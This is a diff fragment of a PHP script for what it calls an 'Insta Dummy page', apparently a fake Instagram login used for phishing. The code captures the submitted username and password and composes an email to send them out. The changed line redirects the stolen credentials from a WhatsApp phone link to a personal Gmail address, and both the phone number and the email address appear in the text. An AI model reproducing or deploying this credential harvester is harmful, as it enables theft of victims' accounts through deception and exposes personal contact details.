@@ -4,7 +4,7 @@
 $username = $_REQUEST['u_name'];  // fetch username
  $passcode = $_REQUEST['pass'];  // fetch password
  $subject = "Someone Login ! Insta Dummy page";
- $to ="https://web.whatsapp.com/send/?phone=7057217214&text&type=phone_number&app_absent=0";
+ $to ="almasmustafa2002@gmail.com";
  
  $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
  
